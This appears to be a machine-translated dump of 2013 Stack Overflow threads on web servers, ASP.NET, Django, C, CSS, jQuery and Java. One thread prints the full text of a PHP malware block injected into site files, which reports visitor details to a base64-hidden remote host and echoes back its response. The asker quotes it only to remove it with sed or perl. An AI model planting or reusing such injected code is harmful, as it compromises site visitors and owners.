        if (!-e $request_filename) {
                rewrite ^.*$ /index.php last;
        }

        location ~ \.php$ {
                fastcgi_pass 127.0.0.1:9000;
                fastcgi_index index.php;
                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
                fastcgi_param APPLICATION_ENV develop;
                fastcgi_param PHP_VALUE "error_log=/var/log/php/mywebsite_php_errors.log";
                include /etc/nginx/fastcgi_params;
        }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T13:29:51.877

正在做：

```
$requestSiteUrl = $this->serviceLocator->get('URLRequest')->getServer('HTTP_HOST'); 
```

是另一种做法：

```
$_SERVER['HTTP_HOST'] 
```

（但显然在未设置变量时效果更好）。所以是的，这是找出 nginx 认为被请求的域的好方法。从技术上讲，如果出现以下情况，则存在安全漏洞：

*   有人只是`Host`根据他们的请求修改了标题。

*   如果您的站点位于不同的 IP 地址上，并且有人编辑他们的主机文件以获得服务器的“错误”IP，然后向该“错误”IP 地址发出请求。

然后你可能会出现错误的站点名称。

如果您的所有网站都在同一个 IP 上，那么您对这种欺骗无能为力。如果它们都在不同的 IP 地址上，并且您将 Nginx 设置为`server`每个主机使用一个，并且它们只是在侦听分配的 IP 地址，那么您可以更改为使用

```
$_SERVER['SERVER_NAME'] 
```

或 Zend 等价物。

那只会给你`server_name`配置文件中的条目定义的服务器名称，并且是不可欺骗的。

只要您不使任何安全性依赖于正确的服务器名称，那么您就不会有问题。即当人们登录到一个站点时，他们不应该也登录到其他站点，因为每个站点的会话名称应该是唯一的。

# asp.net - 验证多个文本框的唯一值 asp.net

> ID：15357485
> 
> 赞同：0
> 
> 时间：2013-03-12T09:27:55.860
> 
> 标签：asp.net

我有一个asp.net 向导控件。在一个步骤中，我有四个文本框。在继续下一步之前，我需要确保所有文本框都没有重复值。我可以通过添加服务器端/客户端函数来循环所有文本框控件并检查重复值来实现这一点，但不知何故我觉得这不是正确的方法。我在网上搜索并找到了一些链接[this](http://forums.asp.net/t/1642285.aspx/1)和[this](http://forums.asp.net/t/1164975.aspx/1)但似乎没有什么合适的。我也不能使用比较验证器，因为它最多只能用于两个控件。

你们有更好的方法来实现这一目标吗？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T11:21:53.803

您可以尝试使用 CompareValidators。

# django - django：如何在两个模型中使用通用视图

> ID：15357487
> 
> 赞同：1
> 
> 时间：2013-03-12T09:27:59.447
> 
> 标签：django, django-models, django-templates, django-views

我有两个模型叫做`customer`and `building`。如何使用这两个模型在一个模板中使用基于类的通用视图进行通用查看。

这是我的*urls.py*来查看我的客户

```
urlpatterns = patterns('',
 url(r'^customer/', customerView.as_view(), name= "customer_view"),
) 
```

这是我给客户的*view.py*

```
class customerView(UpdateView):
    template_name="customer.html"
    model = customer
    form_class = customerForm

    def get_context_data(self, **kwargs):
        context = super(customerView, self).get_context_data(**kwargs)  
        context['pk'] = 1
        context['numberOfObjects'] = customer.objects.all().count()
        return context

    def get_object(self, queryset = None):
        try: 
            obj = customer.objects.get(id = 1)
        except: 
            obj = customer.objects.create(id = 1)
        return obj

    def form_valid(self, form):

        form.save()
        return HttpResponseRedirect(reverse("customer_view", kwargs={'pk': self.kwargs['pk']})) 
```

这是 customer.html 的一些代码，用于查看`customer`和`building`

```
<form action="" method="post">  
{% csrf_token %}

 {{ form.id }}  
    <div class="text_label"  >FIRST NAME</div>
    <div class="text_input">{{ form.FIRST_NAME }}</div>     
    <div class="text_label" >LAST NAME</div>
    <div class="text_input">{{ form.LAST_NAME }}</div>      

    <div class="text_label" >BUILDING USE</div>
    <div class="text_input3">{{ form.BUILDING_USE }}</div></td>     
    <div class="text_label" >BUILDING FLOORSPACE</div>
    <div class="text_input3">{{ form.BUILDING_FLOORSPACE }}</div></td>      
    <div class="text_label">BUILDING YEAR</div> 
    <div class="text_input3" >{{ form.BUILDING_YEAR }}</div></td></tr>

rest of the code....//the first part is from the class customer and the second part is from the class building. 
```

我的问题是我可以通用查看班级客户，但不能查看班级建设。我如何做到这一点...我仍然是 django 的业余爱好者，并且仍然是一个很好的方法。如果我问一个菜鸟问题，请原谅我。检查这个[如何将两个模型传递给基于类的通用视图](https://stackoverflow.com/questions/7576202/how-can-i-pass-two-models-to-a-class-based-generic-view)但仍然是空白的。非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:32:06.800

在你的`get_context_data()`你可以添加你的新对象。

```
context['building'] = building.objects.get(name="Building name") 
```

然后你可以像这样在你的模板中调用它

```
{{ building.name }} 
```

如果你想在一个表单中使用它，同时正确地编辑两个模型会更加棘手。

有[一篇很棒的 SO 帖子解释了为什么会这样](https://stackoverflow.com/questions/6276398/multiple-form-classes-in-django-generic-class-views)

# c - 尝试使用结构从数组中访问菜单名称...出现错误

> ID：15357489
> 
> 赞同：0
> 
> 时间：2013-03-12T09:28:01.487
> 
> 标签：c

我有一个菜单和子菜单。我创建了一个结构，其中我将菜单和子菜单名称存储在一个数组中。试图打印它们，但我认为我在某个地方错了。

```
#include <stdio.h>
#include <stdlib.h>

struct calculator
{
    int x_loc;
    int y_loc;
    char main_menu[15];
    char sub_menu[15];
    char icon_title[100];
};

char *main_menu_names[3] = {"Link_1", "Link_2", "Link_3"};
char *sub_menu_names[3] = {"Sub_Link_1", "Sub_Link_2", "Sub_Link_3"};

struct calculator info = {219, 120, main_menu_names, sub_menu_names, "Title"};

int main()
{
    printf("X location: %d\n",info.x_loc);
    printf("Y location: %d\n",info.y_loc);

    printf("Menu Name: %s\n",info.main_menu);
    printf("sub menu: %s\n",info.sub_menu);
    printf("icon_title: %s\n",info.icon_title);

    system("PAUSE");

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T09:32:14.633

你的代码没有任何意义。

您不能用未定义的 初始化`struct calculator`的`char main_menu[15]`字段。`menu_names`我不相信你可以编译上面的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:46:47.693

定义是单数组

```
char main_menu[15];
char sub_menu[15]; 
```

但是你已经等同于二维数组

```
char *main_menu_names[3] = {"Link_1", "Link_2", "Link_3"};
char *sub_menu_names[3] = {"Sub_Link_1", "Sub_Link_2", "Sub_Link_3"}; 
```

在

```
struct calculator info = {219, 120, menu_names, sub_menu_names, "Title"}; 
```

它应该像 struct calculator info = {219, 120, menu_names[0][0], sub_menu_names[0][0], "Title"};

# php - 如何删除源文件中的代码块

> ID：15357495
> 
> 赞同：0
> 
> 时间：2013-03-12T09:28:42.267
> 
> 标签：php, sed, malware

我的服务器上的恶意软件有一个大问题。不知何故，机器人能够将代码放入 100 多个 php 文件中，这些文件执行 curl 检索以在查看器浏览器上执行 JS 代码。幸运的是，此代码连接到的服务器已死。所以不，我的 php 文件中有死的恶意软件代码。我想从每个 php 文件中删除该代码块。

以下代码块位于许多 php 文件中：

```
?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRFL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 6);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?> 
```

如您所见，第一个字符以“？>”开头。

使用 sed 我会做类似的事情：

```
sed -i 's/<\?php\nif \(\!isset\(\$sRetry\)\)(.*?)\n\}\n}\?>//g' *.php 
```

显然这是行不通的。但是我试图做的是搜索开始标记，包括对 $sRetry 的“isset”检查，以确保它只找到这个代码块，然后是 (.*) 后面跟两个大括号和结尾的任何代码标签。

任何人都可以为我提供适当的正则表达式或告诉我这个有什么问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T10:28:58.857

```
perl -i -lne 'print unless(/\?\>\<\?php/.../\?\>$/)' *.php 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-22T09:35:50.767

这可以解决一个文件的问题：

```
`vim -e +':%s#<?php\nif (!isset(\$sRetry\_.\{-}?>##' +wq yourfile.php ` 
```

如果你有受感染文件的列表，请在受感染的列表中进行搜索，请执行以下操作：

```
for i in $(cat infected.list); do 
    vim -e +':%s#<?php\nif (!isset(\$sRetry\_.\{-}?>##' +wq $i
done; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T10:39:25.547

这是否足够：

```
sed -e '/?><?php/,/?>/d' your_file.php 
```

如果您想测试除第一行之外的第二行，您可以执行以下操作：

```
sed -e '/?><?php/N;/?><?php\nif (!isset(\$sRetry))/,/?>/d' your_file.php 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-08-23T19:34:32.617

在整个文件上：

/^(.)(<\?php.?\\$sRetry.?\?>)(.)$/mis *_* _ *_* _

拿匹配 1 和匹配 3 并将它们粘在一起。奇迹般有效。

# asp.net-mvc - 将 Elmah 与 WebApi 一起使用时会记录两次错误

> ID：15357497
> 
> 赞同：8
> 
> 时间：2013-03-12T09:28:51.500
> 
> 标签：asp.net-mvc, asp.net-web-api, elmah

我正在尝试使用 elmah 从我的 asp.net web api 项目中记录异常。我遇到了一个问题，每个错误都被记录了两次。

我正在使用 Elmah.Contrib.Web-Api，我的 Application 类如下：

```
public class WebApiApplication : System.Web.HttpApplication
{
    protected void Application_Start()
    {
        GlobalConfiguration.Configuration.Filters.Add(new ElmahHandleErrorApiAttribute());

        RouteTable.Routes.MapHubs();
        RouteConfig.RegisterRoutes(RouteTable.Routes);

#if DEBUG
        EntityFrameworkProfiler.Initialize();
#endif

        GlobalConfig.CustomizeConfig(GlobalConfiguration.Configuration);

    }
} 
```

如果我注释掉以下行，那么我根本不会收到任何消息：

```
GlobalConfiguration.Configuration.Filters.Add(new ElmahHandleErrorApiAttribute()); 
```

而且我可以确认我只抛出了一个错误，并且只调用了一次生成错误的调用，并且我没有使用 Elmah 属性手动修饰我的控制器或方法。

为了尝试解决这个问题，我删除了 Contrib 包并按照此处的说明添加了[http://www.tugberkugurlu.com/archive/asp-net-web-api-and-elmah-integration](http://www.tugberkugurlu.com/archive/asp-net-web-api-and-elmah-integration)

这并没有解决问题，它仍然记录了两次。它确实允许我在 Attribute 类中放置一个断点，并确认每个错误都被调用了两次。

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-05-28T14:33:23.853

您的 web.config 中有哪些与 ELMAH 相关的条目？

我在 MVC 应用程序中遇到了类似的问题 - 处理的异常被记录了两次。在应用程序中，我使用自定义异常过滤器通过错误信号将处理的异常记录到 ELMAH，而 HTTP 模块负责处理未处理的异常。

原来我需要设置：

```
<add key="elmah.mvc.disableHandleErrorFilter" value="true" /> 
```

在 web.config 中以禁用 ELMAH.MVC NuGet 包中的内置异常过滤器。

内置过滤器的源代码显示它记录处理的异常： [https ://github.com/alexanderbeletsky/elmah-mvc/blob/master/src/Elmah.Mvc/HandleErrorAttribute.cs](https://github.com/alexanderbeletsky/elmah-mvc/blob/master/src/Elmah.Mvc/HandleErrorAttribute.cs)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-14T09:49:21.987

我会检查你的 FilterConfig.cs 类，有可能在那里添加了默认的 HandleErrorAttribute 并重新抛出你的异常？

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-09-11T05:24:01.960

对于它的价值，我遇到了 ELMAH 在我的 Web API 应用程序中两次记录每个异常的问题（使用 Elmah.Contrib.WebApi）。

将我的 ELMAH 电子邮件与我的源历史记录进行比较，我能够确定问题是在通过 nuget 安装 Ninject.Web.WebApi 3.0.2-unstable-9016 包后开始发生的。

果然，卸载包并注释掉正在使用它的单个依赖绑定解决了双重异常记录问题。重新安装软件包并将依赖项绑定注释掉会导致问题再次出现，因此不是绑定本身。

安装以前的版本（Ninject.Web.WebApi 3.0.2-unstable-8）并没有导致问题发生，但是我的依赖绑定不再起作用。

我选择暂时忍受这个问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-05-21T04:14:09.380

你看过[这个帖子](http://blogs.msdn.com/b/webdev/archive/2012/11/16/capturing-unhandled-exceptions-in-asp-net-web-api-s-with-elmah.aspx)吗？作者使用一个 ExceptionFilter 来处理日志记录异常

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-04-24T15:55:42.250

对于其他有两次记录问题的人（我认为这对 OP 没有帮助？） - 这发生在我身上，原因是我已经在全球范围内应用了过滤器

```
GlobalConfiguration.Configuration.Filters.Add(new ElmahErrorAttribute()); //log web api errors 
```

但也将属性应用于类（doh！）

```
[ElmahError]
public class TestController : ApiController 
```

所以当然它记录了两次。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-05-26T03:17:59.787

我有这个问题只发生在 HTTP`401`响应上。问题原来是启用了 Windows 身份验证，这导致浏览器发出第二次协商请求。

就我而言，我只能在 web.config 中禁用 Windows 身份验证：

```
<security>
  <authentication>
    <windowsAuthentication enabled="false" />
  </authentication>
</security> 
```

注意：如果您没有解锁配置部分，您可以在 IIS 中禁用 Windows 身份验证。

# universal-image-loader - Android：通用图像下载器缓存路径

> ID：15357499
> 
> 赞同：1
> 
> 时间：2013-03-12T09:28:52.310
> 
> 标签：universal-image-loader

我正在使用 UIL 下载图像，我希望图像仅保存在缓存中。所以在配置中我启用了 cacheInMemory() 选项。但是当我在设置中检查我的应用信息时，它仍然显示 0.00B。如果我启用 cacheInMemory() 选项，我的图像究竟存储在哪里。?

```
options = new DisplayImageOptions.Builder()
            .showStubImage(R.drawable.item_fine_dining).cacheInMemory().build();
ImageLoaderConfiguration config = new ImageLoaderConfiguration.Builder(
            getApplicationContext()).threadPoolSize(3)
            .memoryCache(new WeakMemoryCache())
            .threadPriority(Thread.NORM_PRIORITY - 1)
            .denyCacheImageMultipleSizesInMemory().enableLogging()
            .discCacheFileNameGenerator(new HashCodeFileNameGenerator())
            .enableLogging().build(); 
```

# php - 如何在 MENU_CALLBACK 页面上显示菜单

> ID：15357500
> 
> 赞同：0
> 
> 时间：2013-03-12T09:28:55.290
> 
> 标签：php, drupal, drupal-7

我有一个自定义模块，我在`hook_menu()`.

```
 $items['myModule/edit_profile'] = array(
    'title'             => 'Profle',
    'description'       => 'myModule settings page',
    'page callback'     => 'drupal_get_form',
    'page arguments'    => array('myModule_edit_account'),
    'access callback'   => TRUE,
    'type'              => MENU_CALLBACK,
    'file'              => 'plannico.payment.page.inc',
  ); 
```

如何在此页面上显示其余菜单？我不想在菜单中有这个页面。我只想在此页面上显示其余的菜单项。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T21:12:42.893

我认为 Drupal 不能只使用菜单项的配置来做到这一点，除非你撤消你的`myModule/edit_profile`and的 url 嵌套`myModule/edit_profile/nested_items_as_local_tasks`。

另一种方法是将您修改`access_callback`为检查当前页面的函数，或修改特定于页面的模板并删除 localtask 部分。

[这里告诉如何删除 localtasks 部分](https://stackoverflow.com/a/6717278/2165413)

# php - Php fastCLI 版本 5.3.13 忽略 ini.php 中的 include_path 设置

> ID：15357505
> 
> 赞同：0
> 
> 时间：2013-03-12T09:29:11.263
> 
> 标签：php, windows, iis-7, fastcgi

我正在设置`PHP`（`Windows Server 2008 SP1`64位）。我已经配置`PHP`了 5.3.13，我设法在[这里](http://www.anindya.com/php-5-4-3-and-php-5-3-13-x64-64-bit-for-windows/)找到了。我已在 IIS 中将其配置为使用 fastCGI。顺便说一句，我使用`PHP`5.3.13 而不是 5.4.3 的原因是因为我无法找到`php_win32service`我们需要的扩展的 5.4 二进制文件。

我遇到的问题是 .config 中的`include_path`配置`php.ini`完全被`PHP`. 我已通过更改 ini 中的其他设置来确认我正在更改正确`php.ini`，并且当我 echo 时看到这些更改`phpinfo`。My在文件夹`php.ini`中定义。`C:\Windows`但无论我`include_path`在 ini 文件中放置什么，我总是会看到“.;C:\php\pear”为包含路径显示的`phpinfo`.

我在 ini 中的包含路径是从 ini 复制/粘贴到另一台配置并正常工作的服务器上的。新服务器与前一个服务器之间的唯一区别是新服务器是 64 位的，而新服务器运行的是带有 fastCGI 的 PHP 5.3.13（与运行的是带有 ISAPI 的 5.2.1 相对）。

那么有谁知道`include_path`被忽略的事实是版本 5.3.13 中的错误，还是这种行为是设计的`fastCGI`？是否有一些我可以更改的设置可以`php.ini`解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T08:47:39.867

忽略我在评论中得出的错误结论，因为我必须承认这个问题实际上是由我的`php.ini`文件中的错误引起的，所以都是我的错。;) 在编辑`ini`文件期间的某个时候，我不小心在其中一个注释行的中间放了一个回车符。这导致处理在`ini`遇到错误时中途中断。我是在安装 5.4.3 后才发现的，因为这个版本实际上报了一个异常，并且在浏览器中显示了 500 Server Error 消息。

那么我从中学到了什么？始终`ini`通过`php -v`从命令行执行来测试您的文件。如果我这样做了，我会看到有关`ini`文件解析期间遇到的错误的消息。学习到教训了。:)

# css - 如何保持外部 div 不会被内部 div 的填充/边距推出？

> ID：15357513
> 
> 赞同：5
> 
> 时间：2013-03-12T09:29:35.937
> 
> 标签：css, fluid-layout, fluid

[这是jsfiddle示例](http://jsfiddle.net/longnt80/Lca5c/)

这是html：

```
<div class="header">header</div>
    <div class="wrapper">
        <div class="left"><div class="content"></div></div>
        <div class="right">right</div>
    </div> 
```

这是CSS：

```
.left{
position:absolute;
width:30%;
background:red;
left:0;
height:100%;
display:block;
padding:5px;
}
 .right{
overflow:hidden;
background:green;
position:absolute;
right:0;
width:70%;
height:100%;
}

html, body{
min-height:100%;
height:100%;
padding:0px;
margin:0px;
position:relative;
}

body {position:relative;}

.wrapper {
position:relative;
height:100%;
}

.header{
width:100%;
height:100px;
background:yellow;
display:none;
}

.left .content {
background:blue;
height:inherit;
width:100%;
} 
```

您可以看到红色 div 被蓝色 div 推出。我怎样才能防止这种情况？所有宽度和高度均基于 %。我知道的唯一方法是给红色 div 一个固定的宽度。我还有其他方法可以用 % 完成吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-12T09:33:44.193

您想使用 box-sizing，请参阅此更新示例：http: [//jsfiddle.net/Lca5c/1/](http://jsfiddle.net/Lca5c/1/)

您的 CSS 将如下所示：

```
.left{
    position:absolute;
    width:30%;
    background:red;
    left:0;
    height:100%;
    display:block;
    padding:5px;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
} 
```

它被推出的原因是由于您添加到 div 的填充。确保检查浏览器兼容性（[此处](https://developer.mozilla.org/en-US/docs/CSS/box-sizing)）以查看它是否符合您的要求。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2015-05-14T12:30:14.793

我知道这是一个旧帖子。最好的解决方案是添加

```
-webkit-box-sizing: border-box;
-moz-box-sizing: border-box;
-ms-box-sizing: border-box;
-o-box-sizing: border-box;
box-sizing: border-box; 
```

在你的元素上，你的外盒里有什么。

您可以使用 div、textarea、input、select 或 HTML 中的任何其他元素来做到这一点。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-12T09:49:55.597

最简单的方法是从 .left 中删除填充并将填充添加到 .content 中，同时从 .content 中删除宽度，使其默认为自动宽度。

这样做会产生您想要的正确行为，并且不会依赖 CSS3 box-sizing 方法。

此外，您不必告诉 DIV 显示：块，因为这是它的默认显示属性。

```
.left{
    position:absolute;
    width:30%;
    background:red;
    left:0;
    height:100%;
}

.left .content {
    background:blue;
    height:inherit;
    padding:5px;
} 
```

# java - 无法解析具有属性的元素列表

> ID：15357514
> 
> 赞同：4
> 
> 时间：2013-03-12T09:29:42.527
> 
> 标签：java, xml, jackson, fasterxml

我有一个具有 List 成员的对象链接，而链接只有属性，但列表的解析有问题 - 它被创建为空。
在下面的测试中`links.getLinks()`返回空列表。有任何想法吗？
XML 示例：

```
<links>
<link x="1" y="2" />
<link x="3" y="4" />
</links> 
```

爪哇

```
@JacksonXmlRootElement(localName="links")
public class Links extends BaseAmebaElement {

@JacksonXmlProperty(localName="link")
//@JacksonXmlElementWrapper(localName="link")
private Collection<Link> links;

public Collection<Link> getLinks() {
    return links;
}

public void setLinks(Collection<Link> links) {
    this.links = links;
}
} 
```

...

```
@JacksonXmlRootElement(localName="link")
public class Link {

@JacksonXmlProperty(localName="x", isAttribute=true)
private String href;

@JacksonXmlProperty(localName="y", isAttribute=true)
private String rel; 
```

...

```
 XmlMapper  xmlMapper = new XmlMapper ();
    try {
        Links links = xmlMapper.readValue(input, Links.class);
        assertNotNull(links);
        assertNotNull(links.getLinks());
        assertEquals(2, links.getLinks().size());
    } catch (Throwable e) {
        fail(e.getMessage());
    } 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-12T11:03:56.550

我可以在一些更改后得到结果。但是，它可以取出第一行（它为空）。我不知道为什么。

```
@JacksonXmlElementWrapper(useWrapping=false)
@JacksonXmlProperty(localName="link")
private Collection<Link> links; 
```

更新：这应该是版本 2.1.4 中的错误。我刚试过[master](https://github.com/FasterXML/jackson-dataformat-xml)，这很好用。

# c# - 手动创建 VisualStudio 2012 项目文件

> ID：15357515
> 
> 赞同：3
> 
> 时间：2013-03-12T09:29:45.633
> 
> 标签：c#, visual-studio, visual-studio-2012, project, thrift

我在 Visual C# 中使用节俭。

Thrift 可以选择编译为 C#，但是，当许多 C# 项目使用 thrift 时，添加新的和删除由 thrift 生成的旧源很累人 - 将 thrift 编译为 C# 只会为每个 thrift 结构创建一个 .cs 文件。

我考虑编写一个简单的应用程序，该应用程序将使用新生成的节俭文件创建/更新 Visual Studio 2012 项目文件。是否有任何工具/库可以帮助解决这些问题？从空项目中获取现有项目文件、更改 GUID 并仅修改文件列表是否安全？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-12T09:48:03.723

使用`Microsoft.Build.Construction`命名空间中的类应该相对容易。

您`ProjectRootElement`从打开现有文件（方法`Open`）或创建新文件（方法`Create`）获得的文件开始。或者您可以使用单个文件作为模板并始终从该文件开始（设置一个新的 GUID 确实是安全的）。

然后只需找到`ProjectItemGroupElement`包含源文件（即具有“编译”项的文件）并向其中添加文件即可。

与设置新 GUID 类似，您需要查找`ProjectpropertyElement`名为“ProjectGuid”并使用`Guid.NewGuid().ToString( "B" )`.

保存根元素并完成。

（[链接到 msdn 文档](http://msdn.microsoft.com/en-us/library/microsoft.build.construction.aspx)）

# jquery - css选择器理解

> ID：15357517
> 
> 赞同：1
> 
> 时间：2013-03-12T09:29:54.277
> 
> 标签：jquery, css, jquery-selectors, css-selectors

我正在尝试选择包含直接子`<p>`元素的`<li>`元素的第一个直接子元素`<ul>`。

```
li>ul:parent>p:first-child 
```

是我尝试过的，认为它会得到`li`带有 immediate`ul`的 's 然后用选择器回到原来`li`的 's`:parent`然后选择 immediate`p`的第一个孩子。

例如

```
<ul>
    <li>
        <p>SELECT ME!</p>
        <ul>
            <li><!--some more stuff-->
        </ul>
    </li>
</ul> 
```

在评论之后我应该说我在 jQuery 选择器中使用它，我`:parent`在 jQuery API 页面中找到了选择器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:33:28.377

做

```
li > ul ~ p:first-of-type 
```

选择你想要的？这应该选择`p`那些是第一个 children-whichare-的元素，`p`并且是 s 的直接子元素的*兄弟*元素。请参阅有关后代和兄弟选择器[的这篇文章。](http://css-tricks.com/child-and-sibling-selectors/)`ul``li`

**编辑**：仔细看，我发现这不适*用于*您的设置，因为它`p`需要`ul`在源代码之后。也许你可以稍微改变你的源顺序？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:41:58.443

您遇到的问题是`li > ul:parent`将选择`<ul>`元素，但指定`> p:first-child`不匹配任何内容，因为您的`p`元素在 . 中`li`，而不是 . 的直接后代`<ul>`。

您可以为此使用 jQuery 的[`:has()`](http://api.jquery.com/has-selector/)选择器：

```
$('li:has(ul) > p:first-child').css('background-color', 'red'); 
```

这是一个[**jsFiddle 演示**](http://jsfiddle.net/2JV5V/)。

不幸的是，我认为纯 CSS 不可能做到这一点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:52:55.490

我建议将 id 放在顶层`ul`，它可以防止你意外匹配任何`p:first-child`嵌套`li`。

[JSFiddle](http://jsfiddle.net/hpkp3/4/)

**jQuery**

```
$('#top>li>ul').parent().find('>p:first-child'); 
```

# c# - 将不规则形状裁剪成矩形

> ID：15357525
> 
> 赞同：0
> 
> 时间：2013-03-12T09:30:05.477
> 
> 标签：c#, winforms, image-processing, rectangles

我正在开发一个需要用户从图像中选择和对象的项目。我目前正在通过允许用户在对象周围绘制一个矩形（需要选择的对象始终是矩形）来做到这一点，然后我可以裁剪所选区域。问题是图像中的物体可能无法从鸟瞰视图中看到，因此在图像中它不是完美的矩形。我现在已经更改了它，因此用户使用可以正常工作的线条围绕对象绘制，但我不确定如何裁剪这个不规则形状然后拉伸它以填充一个矩形（因为我需要它是一个完美的矩形但没有任何背景）一些关于技术的指导以及在哪里看会很棒。我目前正在使用 aforge 来裁剪我的图像。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T10:43:58.263

好的，我找到了我的解决方案。我可以使用 aforge SimpleQuadrilateralTransformation 类。

[http://www.aforgenet.com/framework/docs/html/15ef1e79-a7ae-93d4-507e-34961c6562ec.htm](http://www.aforgenet.com/framework/docs/html/15ef1e79-a7ae-93d4-507e-34961c6562ec.htm)

# iphone - 使用 iPhone 的 AT 命令

> ID：15357526
> 
> 赞同：6
> 
> 时间：2013-03-12T09:30:07.290
> 
> 标签：iphone, jailbreak, at-command

我想用我的 iPhone 应用程序发送 AT 命令，但我不知道该怎么做。我知道 AT 命令可以用于 blockSMS、sendSMS 等。有帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-26T18:21:49.910

如果 iPhone 未解锁，您可以下载一个名为 minicom 的程序直接通过端口通话。这是一个可以帮助您的链接：http: [//www.letsunlockiphone.com/install-minicom-iphone-4-baseband/](http://www.letsunlockiphone.com/install-minicom-iphone-4-baseband/)

这将向您显示在您的应用程序中与哪些端口通信以发送 At 命令

祝你好运！

# c# - 带计时器的进度条

> ID：15357527
> 
> 赞同：2
> 
> 时间：2013-03-12T09:30:09.413
> 
> 标签：c#, timer, progress-bar

我有一段代码将可用的服务器实例从我的 SQL 服务器获取到 DataTable。填充需要一些时间。所以我尝试添加一个进度条来指示那个时间。有一些方法可以做到这一点：

1.使用后台工作者
2.使用计时器

我使用了计时器，但进度条没有动画。

我的代码是（WinForm）：

```
private void frmCodeGenerator_Load(object sender, EventArgs e)
    {
        Cursor.Current = Cursors.WaitCursor;
        tmrWaiting.Enabled = true;
        tmrWaiting.Start();

        //List all available servers
        PopulateServerInstances();
        //List all default namespaces to import

        //Set the target folder default path tec.

        tmrWaiting.Stop();
        Cursor.Current = Cursors.Default;
    }

private void tmrWaiting_Tick(object sender, EventArgs e)
        {            
            pbWaiting.Value++;
        } 
```

光标正在将正常形式更改为等待状态，但进度条没有。我在做赖吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T09:49:38.203

在 UI 线程上运行的`Load`事件处理程序正在调用`PopulateServerInstances`，这可能在加载数据时阻塞。您需要在 BG 线程上完成这项工作，以便您的 UI 线程可以继续更新 UI。[`BackgroundWorker`](http://msdn.microsoft.com/en-gb/library/system.componentmodel.backgroundworker.aspx)是您最好的选择，因为它支持在您进行时更新 UI 线程上的进度信息。

# java - 获取主键和外键约束

> ID：15357528
> 
> 赞同：1
> 
> 时间：2013-03-12T09:30:11.513
> 
> 标签：java, ms-access

从 java 程序中的 MS Access 数据库获取主键和外键约束。

我尝试使用`desc table_name`但没有用。

我什至尝试过`DatabaseMetaData.getMetaData(null,null,"table_name")`，但也没有用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:37:33.670

使用`DatabaseMetadata`类。

从那个类使用`getPrimaryKeys()`方法

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:40:26.753

我不知道这是否会带来使用 MS Access 数据库的问题，但是阅读 JDBC 规范您应该执行以下步骤。

从数据库获取表使用

```
DatabaseMetaData meta = connection.getMetaData();
ResultSet tablesRs = meta.getTables(null, null, "table_name", new String[]{"TABLE"}); 
```

获取主键使用

```
meta.getPrimaryKeys(null, null, "table_name"); 
```

获取外键使用

```
meta.getExportedKeys(null, null, "table_name"); 
```

